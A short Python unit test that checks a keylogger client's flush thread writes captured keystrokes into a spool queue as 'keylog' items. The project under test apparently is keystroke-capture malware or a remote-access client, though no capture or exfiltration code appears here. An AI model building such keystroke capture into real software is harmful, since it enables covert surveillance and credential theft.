import threading, time, tempfile
from spool import Spool
from client import Keylogger, _keylog_flush_thread

def test_keylog_flush_writes_to_spool(tmp_path):
    kl = Keylogger()
    kl.log_data = list("hello world")
    sp = Spool(tmp_path)
    stop = threading.Event()
    t = threading.Thread(
        target=_keylog_flush_thread,
        args=(kl, sp, stop, 0.05),
        daemon=True
    )
    t.start()
    time.sleep(0.2)
    stop.set()
    t.join(timeout=1)
    items = sp.pending()
    assert len(items) >= 1
    assert items[0]["kind"] == "keylog"
    assert "hello world" in items[0]["payload"]["data"]
